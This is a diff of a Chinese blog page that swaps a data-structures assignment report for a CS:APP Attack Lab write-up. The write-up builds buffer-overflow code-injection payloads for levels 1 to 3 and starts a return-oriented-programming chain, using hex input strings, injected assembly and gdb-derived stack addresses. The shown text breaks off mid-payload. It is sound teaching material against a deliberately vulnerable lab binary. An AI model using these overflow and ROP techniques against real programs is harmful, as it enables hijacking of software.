@@ -4,8 +4,8 @@
 
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="Graphics, Endeavor">
-    <meta name="description" content="DSA CST 1-2 解题报告">
+    <meta name="keywords" content="计算机系统概论 Lab2, Endeavor">
+    <meta name="description" content="CSAPP Lab1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Graphics | Endeavor</title>
+    <title>计算机系统概论 Lab2 | Endeavor</title>
     <link rel="icon" type="image/png" href="/image/favicon.png">
     
     <style>
@@ -307,7 +307,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Graphics</h1>
+                    <h1 class="description center-align post-title">计算机系统概论 Lab2</h1>
                 </div>
             </div>
         </div>
@@ -331,8 +331,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/DSA/">
-                                <span class="chip bg-color">DSA</span>
+                            <a href="/tags/CSAPP/">
+                                <span class="chip bg-color">CSAPP</span>
                             </a>
                         
                     </div>
@@ -347,8 +347,8 @@
                                 CS
                             </a>
                         
-                            <a href="/categories/CS/DSA/" class="post-category">
-                                DSA
+                            <a href="/categories/CS/CSAPP/" class="post-category">
+                                CSAPP
                             </a>
                         
                     </div>
@@ -360,28 +360,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-30
+                    2022-11-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-10-11
+                    2022-12-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    536
+                    2.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    12 分
                 </div>
                 
 
@@ -404,59 +404,388 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="cst-pa1">CST PA1</h1>
-<h2 id="ab-graphics">1-2 A+B Graphics</h2>
-<h3 id="算法构思">算法构思</h3>
-<p>容易想到先将横轴和纵轴的端点进行排序预处理, 进而确定 <span class="math inline">\(n\)</span> 条线段的具体端点. 通过二分查找,
-对于其中每条线段使用 <code>ToLeft</code> 测试来判断其与所给出点 <span class="math inline">\(P\)</span> 和原点 <span class="math inline">\(O\)</span> 的连线段 <span class="math inline">\(OP\)</span> 是否有交点, 高效查找出临界交点,
-进而确定总交点的数目.</p>
-<p>进行<code>ToLeft</code> 测试判断两条直线是否有交点, 可以先算出 <span class="math inline">\(n\)</span> 条线段相应横纵坐标乘积并存储, 以便进行
-<code>ToLeft</code> 测试时无需重复计算, 优化算法时间性能.</p>
-<p>由于端点坐标数据范围为 <span class="math inline">\([1,
-2^{31})\)</span>, 选用 <span class="math inline">\(\text{long
-long}\)</span> 数组来存储坐标与相应乘积;
-二分查找时对于几种临界情况进行了特殊处理与返回,
-主要包含全无交点与全部交点两种情况.</p>
-<h3 id="参考资料">参考资料</h3>
-<p>对 <span class="math inline">\(x\)</span> 轴和 <span class="math inline">\(y\)</span> 轴上的点坐标进行排序主要参考了<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-qsort.html">此文章</a>,
-选择了 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数;</p>
-<h3 id="复杂度估计">复杂度估计</h3>
-<p>数据输入过程的时间复杂度为 <span class="math inline">\(O(n)\)</span>;
-数据排序过程的时间复杂度为 <span class="math inline">\(O(nlogn)\)</span>.</p>
-<p>而算法时间复杂度主要来自二分查找交点的过程:</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-<span class="token comment">// Line 13</span>
-<span class="token comment">// cross 函数返回与线段 OP 存在交点的最上方线段标号.</span>
-<span class="token keyword">int</span> <span class="token function">cross</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                <h1 id="lab-2-attacklab-实验报告">Lab 2 AttackLab 实验报告</h1>
+<h2 id="实验目的">实验目的</h2>
+<ul>
+<li>学习 <code>GDB</code>与 <code>OBJDUMP</code> 的用法;</li>
+<li>了解如何对没有保证缓冲区溢出安全的程序进行攻击;</li>
+<li>熟悉 <code>x86-64</code> 构架下程序栈和参数传递的运行过程.</li>
+</ul>
+<h2 id="实验原理">实验原理</h2>
+<p>导致程序漏洞的关键为 <code>getbuf</code> 函数:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code>
+大小的空间, 并利用这块空间首地址作为 <code>Gets</code>
+函数的参数从标准输入中读取字符. 我们可以通过提供一个超过
+<code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code>
+的栈帧之外写入数据.</p>
+<h2 id="code-injection-attacks">Code Injection Attacks</h2>
+<h3 id="level-1">Level 1</h3>
+<p>需要重写函数的正常返回地址, 将函数重定向到 <code>touch1</code>
+函数.</p>
+<p>首先查看 <code>ctarget</code> 的反汇编代码.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> ctarget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在 <code>getbuf</code> 中, <code>%rsp</code> 被减了
+<code>0x38</code>, <code>BUFFER_SIZE</code> 大小是 <code>56</code>.</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cdb &lt;getbuf&gt;:
+  401cdb:	f3 0f 1e fa          	endbr64 
+  401cdf:	48 83 ec 38          	sub    $0x38,%rsp
+  401ce3:	48 89 e7             	mov    %rsp,%rdi
+  401ce6:	e8 b5 02 00 00       	callq  401fa0 &lt;Gets&gt;
+  401ceb:	b8 01 00 00 00       	mov    $0x1,%eax
+  401cf0:	48 83 c4 38          	add    $0x38,%rsp
+  401cf4:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>touch1</code> 函数地址是 <code>0x401cf5</code>.</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cf5 &lt;touch1&gt;:
+  401cf5:	f3 0f 1e fa          	endbr64 
+  401cf9:	50                   	push   %rax
+  401cfa:	58                   	pop    %rax
+  401cfb:	48 83 ec 08          	sub    $0x8,%rsp
+  401cff:	c7 05 f3 57 00 00 01 	movl   $0x1,0x57f3(%rip)        # 4074fc &lt;vlevel&gt;
+  401d06:	00 00 00 
+  401d09:	48 8d 3d f1 25 00 00 	lea    0x25f1(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;
+  401d10:	e8 6b f3 ff ff       	callq  401080 &lt;puts@plt&gt;
+  401d15:	bf 01 00 00 00       	mov    $0x1,%edi
+  401d1a:	e8 f4 04 00 00       	callq  402213 &lt;validate&gt;
+  401d1f:	bf 00 00 00 00       	mov    $0x0,%edi
+  401d24:	e8 b7 f4 ff ff       	callq  4011e0 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解题思路:</p>
+<ul>
+<li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下
+<code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code>
+的地址.</li>
+<li><code>getbuf</code> 函数执行 <code>ret</code> 指令后, 会从
+<code>%rsp+56</code> 处获取返回地址, 而这块地址被改为
+<code>touch1</code> 的地址, 程序返回 <code>touch1</code> 而非
+<code>test</code>.</li>
+</ul>
+<figure>
+<img src="/pic/36.png" alt="栈帧结构">
+<figcaption aria-hidden="true">栈帧结构</figcaption>
+</figure>
+<p>现在构建输入字符串: 首先使用 <code>0x00</code> 填充栈上
+<code>56</code> 个字节, 然后填充<code>touch1</code>地址,
+注意字节序为小端序存储.</p>
+<pre class="line-numbers language-none"><code class="language-none"># 1.txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="level-2">Level 2</h3>
+<p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 传递进
+<code>%rdi</code> 作为参数, 然后程序流跳转到 <code>touch2</code>
+函数.</p>
+<p>我的 <code>cookie</code> 值为 <code>0x36bf93ac</code>,
+<code>touch2</code> 函数会验证传入的参数 <code>val</code> 是否和
+<code>cookie</code> 相等.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
-        <span class="token keyword">int</span> high <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  
-        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
-        <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
-            mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>  
-                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-        <span class="token punctuation">}</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>touch2</code> 函数地址是 <code>0x401d29</code>.</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401d29 &lt;touch2&gt;:
+  401d29:	f3 0f 1e fa          	endbr64 
+  401d2d:	50                   	push   %rax
+  401d2e:	58                   	pop    %rax
+  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解题思路:</p>
+<ul>
+<li>将返回地址设置为注入代码的地址, 选择在栈顶注入, 返回地址则设置为
+<code>%rsp</code>.</li>
+<li>将 <code>cookie</code> 值移入 <code>%rdi</code>, 随之被
+<code>touch2</code> 作为参数调用.</li>
+<li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用
+<code>touch2</code>, 只能先将 <code>touch2</code> 的地址压栈, 并使用
+<code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li>
+</ul>
+<p>注入代码为:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.s 
+movq   $0x36bf93ac, %rdi
+pushq  $0x401d29
+retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">2</span>.s
+linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">2</span>.o <span class="token operator">&gt;</span> <span class="token number">2</span>.d
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>得到机器代码:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.d
+2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 ac 93 bf 36 	movq   $0x36bf93ac,%rdi
+   7:	68 29 1d 40 00       	pushq  $0x401d29
+   c:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们只需将指令序列
+<code>48 c7 c7 ac 93 bf 36 68 29 1d 40 00 c3</code> 注入栈顶. 下面寻找
+<code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code>, 使用
+<code>gdb</code> 调试.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gdb ctarget
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token builtin class-name">break</span> getbuf
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> run <span class="token parameter variable">-q</span>
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> disas
+<span class="token operator">=</span><span class="token operator">&gt;</span> 0x0000000000401cdb <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     endbr64 
+   0x0000000000401cdf <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     sub    <span class="token variable">$0x38</span>,%rsp
+   0x0000000000401ce3 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:     mov    %rsp,%rdi
+   0x0000000000401ce6 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    callq  0x401fa0 <span class="token operator">&lt;</span>Gets<span class="token operator">&gt;</span>
+   0x0000000000401ceb <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%eax
+   0x0000000000401cf0 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x38</span>,%rsp
+
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi
+0x0000000000401cdf      <span class="token number">12</span>      <span class="token keyword">in</span> buf.c
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi
+<span class="token number">14</span>      <span class="token keyword">in</span> buf.c
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p /x <span class="token variable">$rsp</span>
+<span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p>
+<figure>
+<img src="/pic/37.png" alt="栈帧结构">
+<figcaption aria-hidden="true">栈帧结构</figcaption>
+</figure>
+<p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code>
+填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p>
+<pre class="line-numbers language-none"><code class="language-none"># 2.txt
+48 c7 c7 ac 93 bf 36 68
+29 1d 40 00 c3 00 00 00  &lt;----- 注入代码
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  
+68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="level-3">Level 3</h3>
+<p>需要在输入字符串中注入一段代码, 将 <code>cookie</code>
+变为字符串并传入 <code>%rdi</code>, 然后程序流跳转到 <code>touch3</code>
+函数.</p>
+<p><code>hexmatch</code>函数检查 <code>cookie</code>
+和传进来的字符是否匹配.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>
+    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>touch3</code> 函数会调用 <code>hexmatch</code>
+函数验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> 
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其中每经过一次 <code>while</code> 循环都要访问若干次
-<code>toleft</code> 函数, 此函数调用的时间为常数时间, 因此
-<code>cross</code> 函数的时间复杂度与二分查找相同, 为 <span class="math inline">\(O(logn)\)</span>.</p>
-<p>进而对于 <span class="math inline">\(n\)</span> 条线段信息的输入,
-进行 <span class="math inline">\(m\)</span> 次查询, 算法的时间复杂度为
-<span class="math inline">\(O(mlogn)\)</span>.</p>
-<p>算法空间复杂度主要来自存储横纵坐标与相应乘积的过程:</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-<span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token keyword">long</span> <span class="token keyword">long</span> y<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token keyword">long</span> <span class="token keyword">long</span> z<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>正比于输入数据的数目, 对于 <span class="math inline">\(n\)</span>
-条线段信息的输入, 算法的空间复杂度为 <span class="math inline">\(O(n)\)</span>.</p>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果将 <code>cookie</code> 串存放在 <code>getbuf</code> 栈帧中,
+注意到 <code>hexmatch</code> 中
+<code>char *s = cbuf + random() % 100</code> 可能会覆盖原
+<code>getbuf</code> 栈帧, 造成数据丢失, 因此需将 <code>cookie</code>
+串存放在 <code>test</code> 栈帧中.</p>
+<p>解题思路:</p>
+<ul>
+<li>将 <code>cookie</code> 转为 <code>16</code> 进制字符串存放在
+<code>test</code> 栈帧中.</li>
+<li>将 <code>cookie</code> 串的地址移入 <code>%rdi</code>, 随之被
+<code>touch3</code> 作为参数调用 (结合 <code>%rsp</code>
+的地址与相对偏移量可确定).</li>
+<li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用
+<code>touch3</code>, 只能先将 <code>touch3</code> 的地址压栈, 并使用
+<code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li>
+</ul>
+<p><code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code> 为
+<code>0x55633168</code>, 字符串 <code>cookie</code> 的
+<code>ascii</code> 表示为 <code>33 36 62 66 39 33 61 63 00</code>, 距
+<code>%rsp</code> 的偏移量为 <code>0x40</code>, 因此其地址为
+<code>0x556331a8</code>. 注入代码为:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.s 
+mov    $0x556331a8, %rdi
+pushq  $0x401e4e
+retq
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">3</span>.s
+linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">3</span>.o <span class="token operator">&gt;</span> <span class="token number">3</span>.d
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>得到机器代码:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.d
+3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:	48 c7 c7 a8 31 63 55 	mov    $0x556331a8,%rdi
+   7:	68 4e 1e 40 00       	pushq  $0x401e4e
+   c:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们只需将指令序列
+<code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p>
+<figure>
+<img src="/pic/38.png" alt="栈帧结构">
+<figcaption aria-hidden="true">栈帧结构</figcaption>
+</figure>
+<p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code>
+填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存
+<code>cookie</code> 字符串.</p>
+<pre class="line-numbers language-none"><code class="language-none"># 3.txt
+48 c7 c7 a8 31 63 55 68  &lt;----- 注入代码
+4e 1e 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址
+33 36 62 66 39 33 61 63
+00                 	     &lt;----- cookie 字符串
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="return-oriented-programming-attacks">Return-Oriented Programming
+Attacks</h2>
+<h3 id="level-2-1">Level 2</h3>
+<p>需要做的是重复 <code>Code Injection Attacks</code> 中第二阶段的任务,
+把 <code>cookie</code> 值传送到 <code>%rdi</code>, 然后调用
+<code>touch2</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的
+<code>gadget farm</code> 中找到需要的指令序列.</p>
+<p>需要的代码为:</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax       # 将 cookie 存入 %rax
+movq %rax, %rdi # 将 cookie 存入 %rdi
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><code>popq %rax</code> 的指令字节为
+<code>58</code>，找到了如下函数:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f1d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_439</span><span class="token punctuation">&gt;</span></span>:
+  401f1d:	f3 0f 1e fa          	endbr64 
+  401f21:	c7 07 58 c3 4c cf    	movl   $0xcf4cc358,(%rdi)
+  401f27:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得出 <code>popq %rax</code> 指令的地址为 <code>0x401f23</code>.</p>
+<p><code>movq %rax, %rdi</code> 的指令字节为 <code>48 89 c7</code>,
+找到了如下函数:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f12 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_318</span><span class="token punctuation">&gt;</span></span>:
+  401f12:	f3 0f 1e fa          	endbr64 
+  401f16:	c7 07 6f 48 89 c7    	movl   $0xc789486f,(%rdi)
+  401f1c:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得出 <code>movq %rax, %rdi</code> 指令的地址为
+<code>0x401f19</code>.</p>
+<figure>
+<img src="/pic/39.png" alt="栈帧结构">
+<figcaption aria-hidden="true">栈帧结构</figcaption>
+</figure>
+<p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入
+<code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与
+<code>touch2</code> 函数的起始地址.</p>
+<pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
